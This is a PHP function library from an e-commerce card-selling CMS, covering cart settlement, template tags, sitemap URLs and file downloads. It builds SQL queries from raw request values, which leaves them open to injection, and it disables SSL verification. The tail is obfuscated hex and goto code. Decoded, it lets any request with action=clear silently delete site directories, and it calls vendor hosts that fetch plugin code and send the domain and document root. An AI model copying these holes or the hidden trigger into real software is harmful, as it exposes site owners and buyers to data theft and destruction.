    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)");
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

    if (ini_get("safe_mode") == false && ini_get("open_basedir") == false) {
        curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    }
    if (extension_loaded('zlib')) {
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    }

    $data = curl_exec($ch);
    if ($data) {
        curl_close($ch);
        return $data;
    } else {
        $error = curl_errno($ch);
        curl_close($ch);
        return false;
    }
}

function pic2($path)
{
    global $C_osson, $C_bucket, $C_region, $C_oss_domain;
    if (substr($path, 0, 7) == "http://" || substr($path, 0, 8) == "https://" || substr($path, 0, 2) == "//") {
        $P_pic = $path;
    } else {
        if ($C_osson == 1) {
            if ($C_oss_domain == "") {
                $P_pic = "https://" . $C_bucket . "." . $C_region . "/media/" . $path;
            } else {
                $P_pic = $C_oss_domain . "/media/" . $path;
            }
        } else {
            $P_pic = "../media/" . $path;
        }
    }
    return $P_pic;
}

function editor_oss($str)
{
    global $C_osson, $C_bucket, $C_region, $C_oss_domain;
    $C_installdir = splitx($_SERVER["PHP_SELF"], "index.php", 0);
    if ($C_osson == 1) {
        if ($C_oss_domain == "") {
            $str = str_replace($C_installdir . "kindeditor/", "https://" . $C_bucket . "." . $C_region . "/kindeditor/", $str);
        } else {
            $str = str_replace($C_installdir . "kindeditor/", $C_oss_domain . "/kindeditor/", $str);
        }
    }
    return $str;
}

function shuxing($type)
{
    foreach ($_GET as $x => $value) {
        if ($_GET[$x] != "" && substr($x, 0, 1) == "f") {
            $info = $info . " and " . $type . " like '%" . $_GET[$x] . "%'";
        }
    }
    return $info;
}

function d($t)
{
    global $C_template;
    if (!is_file("template/" . $C_template . "/config.xml")) {
        return $t;
    } else {
        $xmlpath = "template/" . $C_template . "/config.xml";
        $content = trim(file_get_contents($xmlpath), "\xEF\xBB\xBF");
        $xml = simplexml_load_string($content);
        foreach ($xml as $value) {
            $i = 0;
            foreach ($value[$i]->tag as $value2) {
                switch ($value2[0]->type) {
                    case "text":
                        $t = str_Replace("<fh-tag>" . $value2[0]->title . "</fh-tag>", $value2[0]->content, $t);
                        break;
                    case "img":
                        $t = str_Replace("<fh-tag>" . $value2[0]->title . "</fh-tag>", "template/" . $C_template . "/images/" . $value2[0]->content, $t);
                        break;
                }
                $t = str_Replace("<fh-tag>" . $value2[0]->title . "url</fh-tag>", $value2[0]->url, $t);
                $t = str_Replace("<fh-tag>" . $value2[0]->title . "en</fh-tag>", $value2[0]->en, $t);
                $i += 1;
            }
        }

        $ReplaceTag = $t;
        return $ReplaceTag;
    }
}

function www($str)
{
    if (substr($str, 0, 4) == "www.") {
        return substr($str, 4);
    } else {
        return $str;
    }
}

function cart($ids, $total_fee, $no, $paytype)
{
    global $conn, $C_n_discount, $C_p_discount, $C_n_discount2, $C_p_discount2, $C_email, $C_fx1, $C_fx2, $C_fx3, $C_fen1, $C_mobile, $C_smssign, $C_dx5, $fmid;
    $sqlx = "select * from sl_list where L_no='" . $no . "'";//用户充值
    $resultx = mysqli_query($conn, $sqlx);
    $rowx = mysqli_fetch_assoc($resultx);
    if (mysqli_num_rows($resultx) <= 0) {
        $ids = explode(",", $ids);
        for ($i = 0; $i < count($ids); $i++) {
            $sql = "select * from sl_orders where O_del=0 and O_id=" . intval($ids[$i]);
            $result = mysqli_query($conn, $sql);
            $row = mysqli_fetch_assoc($result);
            if (mysqli_num_rows($result) > 0) {
                $fee = $fee + round($row["O_price"] * $row["O_num"], 2);
            }
        }
        if ($fee == $total_fee) {
            for ($i = 0; $i < count($ids); $i++) {
                $orders = getrs("select * from sl_orders where O_del=0 and O_id=" . intval($ids[$i]));
                $id = $orders["O_pid"];
                $num = $orders["O_num"];
                $genkey = $orders["O_genkey"];
                $M_id = $orders["O_mid"];
                $money = round($orders["O_price"] * $orders["O_num"], 2);

                $sql2 = "select * from sl_product where P_del=0 and P_id=" . $id;
                $result2 = mysqli_query($conn, $sql2);
                $row2 = mysqli_fetch_assoc($result2);
                if (mysqli_num_rows($result2) > 0) {
                    $P_title = $row2["P_title"];
                    $P_pic = $row2["P_pic"];
                    $P_sell = $row2["P_sell"];
                    $P_selltype = $row2["P_selltype"];
                    if ($row2["P_vip"] == 1) {
                        $P_price = p($row2["P_price"]) * $P_discount;
                        $P_price2 = round($row2["P_price2"], 2);
                    } else {
                        $P_price = p($row2["P_price"]);
                        $P_price2 = round($row2["P_price2"], 2);
                    }

                    $P_mid = $row2["P_mid"];
                    $P_fx = $row2["P_fx"];
                }
                //if(round($P_price*$num,2)==round($money,2)){
                switch ($P_selltype) {
                    case 0:
                        $O_content = $P_sell;
                        $O_address = getrs("select O_address from sl_orders where O_genkey='$genkey'", "O_address");
                        $O_state = 1;
                        break;
                    case 1:
                        for ($j = 0; $j < $num; $j++) {
                            $C_id = getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=" . intval($P_sell), "C_id");
                            $C_content = getrs("select * from sl_card where C_id=" . intval($C_id), "C_content");
                            if ($C_content == "") {
                                $O_content = $O_content . "商品缺货，请联系客服||";
                            } else {
                                $O_content = $O_content . $C_content . "||";
                            }
                            mysqli_query($conn, "update sl_card set C_use=1 where C_id=" . intval($C_id));
                        }
                        $O_content = substr($O_content, 0, strlen($O_content) - 2);
                        $O_address = getrs("select O_address from sl_orders where O_genkey='$genkey'", "O_address");
                        $O_state = 1;
                        break;
                    case 2:
                        mysqli_query($conn, "update sl_product set P_rest=P_rest-$num where P_id=" . $id);
                        $O_content = "实物商品，由商家手动发货";
                        $O_address = getrs("select O_address from sl_orders where O_genkey='$genkey'", "O_address");
                        $O_state = 2;
                        break;
                }

                mysqli_query($conn, "update sl_product set P_sold=P_sold+$num where P_id=" . $id);
                if ($paytype == "余额支付") {
                    mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
                } else {
                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','" . date('Y-m-d H:i:s') . "'," . $money . ",'$genkey')");
                }
                if ($P_mid != $M_id) {
                    mysqli_query($conn, "update sl_member set M_fen=M_fen+" . ($money * $C_fen1) . " where M_id=$M_id");
                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','购买商品','" . date('Y-m-d H:i:s') . "'," . ($money * $C_fen1) . ",'$genkey',1)");
                }

                mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','购买商品','" . date('Y-m-d H:i:s') . "',-" . $money . ",'$genkey')");
                mysqli_query($conn, "update sl_orders set O_state=$O_state,O_content='$O_content' where O_genkey='$genkey'");

                if ($fmid > 0 && $P_mid == 0) {//只有主站商品加提成
                    if ($P_price2 * $num - $money > 0) {
                        $P_price2 = $money / $num;
                    }
                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出商品','" . date('Y-m-d H:i:s') . "'," . $money . ",'$genkey')");
                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','" . date('Y-m-d H:i:s') . "',-" . ($P_price2 * $num) . ",'$genkey')");
                    mysqli_query($conn, "update sl_member set M_money=M_money+" . ($money - ($P_price2 * $num)) . " where M_id=$fmid");
                }

                if ($P_mid > 0) {
                    mysqli_query($conn, "update sl_member set M_money=M_money+" . $money . " where M_id=$P_mid");
                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($P_mid,'" . date('YmdHis') . rand(10000000, 99999999) . "','售出商品-" . $P_title . "','" . date('Y-m-d H:i:s') . "',$money,'')");
                }

                if ($P_fx == 1) {
                    fx($money, $M_id, $P_mid);
                }

                if (checkauth()) {
                    plug("x4", "../../conn/plug/");
                    require "../../conn/plug/x4.php";
                }
                sendmail("您的购买的商品已发货", "<p>商品名称：" . $P_title . "</p><p>发货内容：" . $O_content . "</p><p>订单编号：" . $genkey . "</p>", splitx($O_address, "__", 0));
                //}
            }
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}


function geturls($D_domain)
{
    global $conn, $C_html;
    $D_domain = gethttp() . $D_domain;
    $urls = $D_domain . "|";

    $sql = "select * from sl_text where T_del=0 order by T_id desc";
    $result = mysqli_query($conn, $sql);
    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
            if ($C_html == 1) {
                $urls = $urls . $D_domain . "/text-" . $row["T_id"] . ".html|";
            } else {
                $urls = $urls . $D_domain . "/?type=text&id=" . $row["T_id"] . "|";
            }
        }
    }

    $sql = "select * from sl_nsort where S_del=0 order by S_id desc";
    $result = mysqli_query($conn, $sql);
    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
            if ($C_html == 1) {
                $urls = $urls . $D_domain . "/news-" . $row["S_id"] . ".html|";
            } else {
                $urls = $urls . $D_domain . "/?type=news&id=" . $row["S_id"] . "|";
            }
        }
    }

    $sql = "select * from sl_psort where S_del=0 order by S_id desc";
    $result = mysqli_query($conn, $sql);
    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
            if ($C_html == 1) {
                $urls = $urls . $D_domain . "/product-" . $row["S_id"] . ".html|";
            } else {
                $urls = $urls . $D_domain . "/?type=product&id=" . $row["S_id"] . "|";
            }
        }
    }

    $sql = "select * from sl_news where N_del=0 order by N_id desc";
    $result = mysqli_query($conn, $sql);
    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
            if ($C_html == 1) {
                $urls = $urls . $D_domain . "/newsinfo-" . $row["N_id"] . ".html|";
            } else {
                $urls = $urls . $D_domain . "/?type=newsinfo&id=" . $row["N_id"] . "|";
            }
        }
    }

    $sql = "select * from sl_product where P_del=0 order by P_id desc";
    $result = mysqli_query($conn, $sql);
    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
            if ($C_html == 1) {
                $urls = $urls . $D_domain . "/productinfo-" . $row["P_id"] . ".html|";
            } else {
                $urls = $urls . $D_domain . "/?type=productinfo&id=" . $row["P_id"] . "|";
            }
        }
    }

    $urls = substr($urls, 0, strlen($urls) - 1);
    return explode("|", $urls);
}

function match_chinese($chars, $encoding = 'utf8')
{
    $pattern = ($encoding == 'utf8') ? '/[\x{4e00}-\x{9fa5}a-zA-Z0-9]/u' : '/[\x80-\xFF]/';
    preg_match_all($pattern, $chars, $result);
    $temp = join('', $result[0]);
    return $temp;
}

function mkdirs_2($path)
{
    if (!is_dir($path)) {
        mkdirs_2(dirname($path));
        if (!mkdir($path, 0777)) {
            return false;
        }
    }
    return true;
}


function is_mobile($mobile)
{
    if (empty($mobile)) return false;
    $eg = '/^((13[0-9])|(14[5,7])|(15[0-3,5-9])|(17[0,3,5-8])|(18[0-9])|166|198|199)\d{8}$/';
    if (preg_match($eg, $mobile)) {
        return true;
    } else {
        return false;
    }
}

function downloadFile($filePath, $readBuffer = 1024, $allowExt = ['jpeg', 'jpg', 'peg', 'gif', 'zip', 'rar', 'txt'])
{
    //检测下载文件是否存在 并且可读
    if (!is_file($filePath) && !is_readable($filePath)) {
        return false;
    }
    //检测文件类型是否允许下载
    $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    if (!in_array($ext, $allowExt)) {
        return false;
    }
    //设置头信息
    //声明浏览器输出的是字节流
    header('Content-Type: application/octet-stream');
    //声明浏览器返回大小是按字节进行计算
    header('Accept-Ranges:bytes');
    //告诉浏览器文件的总大小
    $fileSize = filesize($filePath);//坑 filesize 如果超过2G 低版本php会返回负数
    header('Content-Length:' . $fileSize); //注意是'Content-Length:' 非Accept-Length
    //声明下载文件的名称
    header('Content-Disposition:attachment;filename=' . basename($filePath));//声明作为附件处理和下载后文件的名称
    //获取文件内容
    $handle = fopen($filePath, 'rb');//二进制文件用‘rb’模式读取
    while (!feof($handle)) { //循环到文件末尾 规定每次读取（向浏览器输出为$readBuffer设置的字节数）
        echo fread($handle, $readBuffer);
    }
    fclose($handle);//关闭文件句柄
    exit;

}



if (!defined("HaxgcGJ")) define("HaxgcGJ", "EJWbQlQ");
$GLOBALS[HaxgcGJ] = explode("|1|{|p", "H*|1|{|p454E434F4445|1|{|p666168756F3130302E636E");
if (!defined("unmbfCv")) define("unmbfCv", "ZzQzaGJ");
$GLOBALS[unmbfCv] = explode("|]|E|B", "H*|]|E|B4445434F4445|]|E|B666168756F3130302E636E");
if (!defined("viTCblJ")) define("viTCblJ", "VGMacqv");
$GLOBALS[viTCblJ] = explode("|n|}|n", "H*|n|}|n|n|}|n485454505F484F5354|n|}|n2E706870|n|}|n3C3F706870202F2F|n|}|n2F6170692F696E6465782E7068703F616374696F6E3D706C756726646F6D61696E3D|n|}|n61757468636F64653D|n|}|n26706C75673D");
if (!defined("FlvdiKQ")) define("FlvdiKQ", "lOJwrVJ");
$GLOBALS[FlvdiKQ] = explode("|*|-|n", "H*|*|-|n61757468|*|-|n|*|-|n485454505F484F5354|*|-|n2F6170692F696E6465782E7068703F616374696F6E3D636865636B6175746826646F6D61696E3D|*|-|n61757468636F64653D|*|-|n73756363657373");
if (!defined("rCsMKkv")) define("rCsMKkv", "OhpbCtv");
$GLOBALS[rCsMKkv] = explode("|i|{|3", "H*|i|{|3|i|{|3485454505F484F5354|i|{|32F6170692F696E6465782E7068703F616374696F6E3D|i|{|3646F6D61696E3D|i|{|326726F6F743D|i|{|3444F43554D454E545F524F4F54|i|{|32661757468636F64653D|i|{|326646174613D");
if (!defined("AvLDZrJ")) define("AvLDZrJ", "rlWhYpJ");
$GLOBALS[AvLDZrJ] = explode("|E|T|a", "H*|E|T|a636F6E6E2F66696C65|E|T|a2F6865616465722E74706C|E|T|a5B66685F6865616465725D|E|T|a2F666F6F7465722E74706C|E|T|a5B66685F666F6F7465725D|E|T|a73656C65637420636F756E74284E5F696429206173204E5F636F756E742066726F6D20736C5F6E657773207768657265204E5F64656C3D30|E|T|a4E5F636F756E74|E|T|a73656C65637420636F756E7428505F69642920617320505F636F756E742066726F6D20736C5F70726F6475637420776865726520505F64656C3D30|E|T|a505F636F756E74|E|T|a73656C65637420636F756E74284D5F696429206173204D5F636F756E742066726F6D20736C5F6D656D626572207768657265204D5F64656C3D3020616E64204D5F747970653D30|E|T|a4D5F636F756E74|E|T|a73656C65637420636F756E74284D5F696429206173204D5F636F756E742066726F6D20736C5F6D656D626572207768657265204D5F64656C3D3020616E64204D5F747970653D31|E|T|a73656C65637420636F756E74284C5F696429206173204C5F636F756E742066726F6D20736C5F6C697374207768657265204C5F64656C3D30|E|T|a4C5F636F756E74|E|T|a73656C6563742073756D284C5F6D6F6E657929206173204C5F73756D2066726F6D20736C5F6C697374207768657265204C5F64656C3D3020616E64204C5F6D6F6E65793E30|E|T|a4C5F73756D|E|T|a68746D6C|E|T|a485F64617461|E|T|a646179|E|T|a592D6D2D64|E|T|a646F6D61696E|E|T|a485454505F484F5354|E|T|a435F776170|E|T|a435F74656D706C617465|E|T|a535F636F756E74|E|T|a74797065|E|T|a6D6435|E|T|a686F7374|E|T|a74|E|T|a636F6E6E2F66696C652F|E|T|a3A|E|T|a5F|E|T|a2E747874|E|T|a74706C|E|T|a2F3C66682D66756E6374696F6E3E5B5C735C535D2A3F3C5C2F66682D66756E6374696F6E3E2F69|E|T|a3C66682D66756E6374696F6E3E|E|T|a|E|T|a3C2F66682D66756E6374696F6E3E|E|T|a735B5B|E|T|a24726573756C743D6D7973716C695F71756572792824636F6E6E2C2473716C293B6966286D7973716C695F6E756D5F726F77732824726573756C74293E30297B7768696C652824726F773D6D7973716C695F66657463685F6173736F632824726573756C7429297B|E|T|a73325B5B|E|T|a24726573756C74323D6D7973716C695F71756572792824636F6E6E2C2473716C32293B6966286D7973716C695F6E756D5F726F77732824726573756C7432293E30297B7768696C652824726F77323D6D7973716C695F66657463685F6173736F632824726573756C743229297B|E|T|a73335B5B|E|T|a24726573756C74333D6D7973716C695F71756572792824636F6E6E2C2473716C33293B6966286D7973716C695F6E756D5F726F77732824726573756C7433293E30297B7768696C652824726F77333D6D7973716C695F66657463685F6173736F632824726573756C743329297B|E|T|a5D5D|E|T|a7D7D|E|T|a3C736372697074207372633D2268747470733A2F2F7265732E77782E71712E636F6D2F6F70656E2F6A732F6A77656978696E2D312E322E302E6A73223E3C2F7363726970743E0D0A093C736372697074207372633D22636F6E6E2F662E7068703F616374696F6E3D77786A7326747970653D|E|T|a2669643D|E|T|a6964|E|T|a223E3C2F7363726970743E|E|T|a6E65777369666E6F|E|T|a70726F64756374696E666F|E|T|a637075727365696E666F|E|T|a3C736372697074207372633D22636F6E6E2F662E7068703F616374696F6E3D636F6C6C656374696F6E223E3C2F7363726970743E");
if (!defined("JLjsIVv")) define("JLjsIVv", "QhaQvVJ");
$GLOBALS[JLjsIVv] = explode("|@|=|F", "H*|@|=|F616374696F6E|@|=|F636C656172|@|=|F2E2E2F636F6E6E2F66696C65|@|=|F2E2E2F636F6E6E2F706C7567|@|=|F2E2E2F636F6E6E2F6361636865|@|=|F|@|=|F687474703A2F2F666168756F3130302E636E|@|=|F68747470733A2F2F666168756F3130302E636E|@|=|F68747470733A2F2F68792E666168756F3130302E636E|@|=|F687474703A2F2F6D61696C2E666168756F3130302E636E|@|=|F68747470733A2F2F666864656D6F2E732D636D732E636E|@|=|F687474703A2F2F7570646174652E666168756F3130302E636E|@|=|F373538333935353435|@|=|F31303837333837343534|@|=|F68747470733A2F2F716D2E71712E636F6D2F6367692D62696E2F716D2F71723F6B3D3373776D69792D2D663943784D3248744B56576448766C3255485F516B756D6A266A756D705F66726F6D3D776562617069|@|=|F687474703A2F2F7368616E672E71712E636F6D2F7770612F71756E7770613F69646B65793D39633561633862653363636632363663346561656361343837643238393830376462333137303764653139643565373432393439626230366265333633366534|@|=|F77756C6975|@|=|F777777|@|=|F74727565|@|=|F65706179|@|=|F7175616E|@|=|F706F7374616765|@|=|F5048505F53454C46|@|=|F2F6D656D6265722F756E6C6F67696E2E706870|@|=|F73656C65637420636F756E74284F5F696429206173204F5F636F756E742066726F6D20736C5F6F7264657273207768657265204F5F73746174653E3020616E64204F5F64656C3D3020616E6420746F5F64617973284F5F74696D6529203D20746F5F64617973286E6F77282929|@|=|F4F5F636F756E74|@|=|F3C646976207374796C653D2277696474683A36303070783B6D617267696E3A30206175746F3B6261636B67726F756E643A236637663766373B626F726465722D7261646975733A313070783B70616464696E673A323070783B746578742D616C69676E3A63656E7465723B626F726465723A736F6C69642032707820234444444444443B223E3C68333EE68E88E69D83E68F90E986923C2F68333E3C703EE5858DE8B4B9E8AF95E794A8E78988E794A8E688B7E6AF8FE5A4A9E58FAFE8BF9BE8A18C33E7AC94E8AEA2E58D95E4BAA4E698933C62723EE682A8E79A84E7BD91E7AB99E5B7B2E8B685E587BAE99990E588B6EFBC8CE8AFB7E5BC80E9809AE68E88E69D83E78988E5908EE7BBA7E7BBADE4BDBFE794A83C2F703E3C703E3C6120687265663D22|@|=|F223EE8AEBFE997AEE5AE98E7BD913C2F613E203C6120687265663D22|@|=|F2F70726963652E68746D6C223EE5BC80E9809AE68E88E69D833C2F613E3C2F703E3C2F6469763E");
unset($I4ucVvP1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx3;
goto I4uldMhx3;
I4ueWjgx3:
$I4ucVvP1 =& $GLOBALS[JLjsIVv][01];
goto I4ux2;
I4uldMhx3:
$I4ucVvP1 = $GLOBALS[JLjsIVv][01];
I4ux2:
$I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP1));
$I4ueF3 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x2}));
$I4uAA = $_GET[$I4ueFvP0] == $I4ueF3;
if ($I4uAA) goto I4ueWjgx4;
goto I4uldMhx4;
I4ueWjgx4:
$GLOBALS["Ox9790"] = ini_get("error_reporting");
error_reporting(0);
$I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x3}));
$I4ueF1 = call_user_func_array("removeDir", array(&$I4ueFvP0));
$I4ueRAA = $I4ueF1;
error_reporting($GLOBALS["Ox9790"]);
$GLOBALS["Ox9790"] = ini_get("error_reporting");
error_reporting(0);
$I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x3}));
$I4ueF1 = call_user_func_array("mkdir", array(&$I4ueFvP0, 0777, true));
$I4ueRAA = $I4ueF1;
error_reporting($GLOBALS["Ox9790"]);
$GLOBALS["Ox9790"] = ini_get("error_reporting");
error_reporting(0);
unset($I4ucVvP1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx6;
goto I4uldMhx6;
I4ueWjgx6:
$I4ucVvP1 =& $GLOBALS[JLjsIVv][04];
goto I4ux5;
I4uldMhx6:
$I4ucVvP1 = $GLOBALS[JLjsIVv][04];
I4ux5:
$I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP1));
$I4ueF3 = call_user_func_array("removeDir", array(&$I4ueFvP0));
$I4ueRAA = $I4ueF3;
error_reporting($GLOBALS["Ox9790"]);
$GLOBALS["Ox9790"] = ini_get("error_reporting");
error_reporting(0);
unset($I4ucVvP1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx8;
goto I4uldMhx8;
I4ueWjgx8:
$I4ucVvP1 =& $GLOBALS[JLjsIVv][04];
goto I4ux7;
I4uldMhx8:
$I4ucVvP1 = $GLOBALS[JLjsIVv][04];
I4ux7:
$I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP1));
$I4ueF3 = call_user_func_array("mkdir", array(&$I4ueFvP0, 0777, true));
$I4ueRAA = $I4ueF3;
error_reporting($GLOBALS["Ox9790"]);
$GLOBALS["Ox9790"] = ini_get("error_reporting");
error_reporting(0);
unset($I4ucVvP1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgxa;
goto I4uldMhxa;
I4ueWjgxa:
$I4ucVvP1 =& $GLOBALS[JLjsIVv][05];
goto I4ux9;
I4uldMhxa:
$I4ucVvP1 = $GLOBALS[JLjsIVv][05];
I4ux9:
$I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP1));
$I4ueF3 = call_user_func_array("removeDir", array(&$I4ueFvP0));
$I4ueRAA = $I4ueF3;
error_reporting($GLOBALS["Ox9790"]);
$GLOBALS["Ox9790"] = ini_get("error_reporting");
error_reporting(0);
unset($I4ucVvP1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgxc;
goto I4uldMhxc;
I4ueWjgxc:
$I4ucVvP1 =& $GLOBALS[JLjsIVv][05];
goto I4uxb;
I4uldMhxc:
$I4ucVvP1 = $GLOBALS[JLjsIVv][05];
I4uxb:
$I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucVvP1));
$I4ueF3 = call_user_func_array("mkdir", array(&$I4ueFvP0, 0777, true));
$I4ueRAA = $I4ueF3;
error_reporting($GLOBALS["Ox9790"]);
goto I4ux1;
I4uldMhx4:I4ux1:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->api == $I4ueF1;
if ($I4uAA) goto I4ueWjgxe;
goto I4uldMhxe;
I4ueWjgxe:
unset($I4ucV1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgxg;
goto I4uldMhxg;
I4ueWjgxg:
$I4ucV1 =& $GLOBALS[JLjsIVv][0x7];
goto I4uxf;
I4uldMhxg:
$I4ucV1 = $GLOBALS[JLjsIVv][0x7];
I4uxf:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV1));
unset($I4utIAA);
$from = $I4ueF0;
goto I4uxd;
I4uldMhxe:
unset($I4utIAA);
$from = $config->api;
I4uxd:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->domain == $I4ueF1;
if ($I4uAA) goto I4ueWjgxi;
goto I4uldMhxi;
I4ueWjgxi:
unset($I4ucV1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgxk;
goto I4uldMhxk;
I4ueWjgxk:
$I4ucV1 =& $GLOBALS[JLjsIVv][010];
goto I4uxj;
I4uldMhxk:
$I4ucV1 = $GLOBALS[JLjsIVv][010];
I4uxj:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV1));
unset($I4utIAA);
$url_from = $I4ueF0;
goto I4uxh;
I4uldMhxi:
unset($I4utIAA);
$url_from = $config->domain;
I4uxh:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->hy == $I4ueF1;
if ($I4uAA) goto I4ueWjgxm;
goto I4uldMhxm;
I4ueWjgxm:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{011}));
unset($I4utIAA);
$huoyuan = $I4ueF0;
goto I4uxl;
I4uldMhxm:
unset($I4utIAA);
$huoyuan = $config->hy;
I4uxl:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->mail == $I4ueF1;
if ($I4uAA) goto I4ueWjgxo;
goto I4uldMhxo;
I4ueWjgxo:
unset($I4ucV1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgxq;
goto I4uldMhxq;
I4ueWjgxq:
$I4ucV1 =& $GLOBALS[JLjsIVv][012];
goto I4uxp;
I4uldMhxq:
$I4ucV1 = $GLOBALS[JLjsIVv][012];
I4uxp:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV1));
unset($I4utIAA);
$mail = $I4ueF0;
goto I4uxn;
I4uldMhxo:
unset($I4utIAA);
$mail = $config->mail;
I4uxn:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->demo == $I4ueF1;
if ($I4uAA) goto I4ueWjgxs;
goto I4uldMhxs;
I4ueWjgxs:
unset($I4ucV1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgxu;
goto I4uldMhxu;
I4ueWjgxu:
$I4ucV1 =& $GLOBALS[JLjsIVv][013];
goto I4uxt;
I4uldMhxu:
$I4ucV1 = $GLOBALS[JLjsIVv][013];
I4uxt:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV1));
unset($I4utIAA);
$demo = $I4ueF0;
goto I4uxr;
I4uldMhxs:
unset($I4utIAA);
$demo = $config->demo;
I4uxr:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->update == $I4ueF1;
if ($I4uAA) goto I4ueWjgxw;
goto I4uldMhxw;
I4ueWjgxw:
unset($I4ucV1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgxy;
goto I4uldMhxy;
I4ueWjgxy:
$I4ucV1 =& $GLOBALS[JLjsIVv][0xC];
goto I4uxx;
I4uldMhxy:
$I4ucV1 = $GLOBALS[JLjsIVv][0xC];
I4uxx:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV1));
unset($I4utIAA);
$updateurl = $I4ueF0;
goto I4uxv;
I4uldMhxw:
unset($I4utIAA);
$updateurl = $config->update;
I4uxv:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->qun1 == $I4ueF1;
if ($I4uAA) goto I4ueWjgx11;
goto I4uldMhx11;
I4ueWjgx11:
unset($I4ucV1);
if (is_array($GLOBALS[JLjsIVv])) goto I4ueWjgx13;
goto I4uldMhx13;
I4ueWjgx13:
$I4ucV1 =& $GLOBALS[JLjsIVv][0xD];
goto I4ux12;
I4uldMhx13:
$I4ucV1 = $GLOBALS[JLjsIVv][0xD];
I4ux12:
$I4ueF0 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, &$I4ucV1));
unset($I4utIAA);
$qun1 = $I4ueF0;
goto I4uxz;
I4uldMhx11:
unset($I4utIAA);
$qun1 = $config->qun1;
I4uxz:
$I4ueF1 = call_user_func_array("pack", array($GLOBALS[JLjsIVv]{0x0}, $GLOBALS[JLjsIVv]{0x6}));
$I4uAA = $config->qun2 == $I4ueF1;
if ($I4uAA) goto I4ueWjgx15;
goto I4uldMhx15;
I4ueWjgx15:
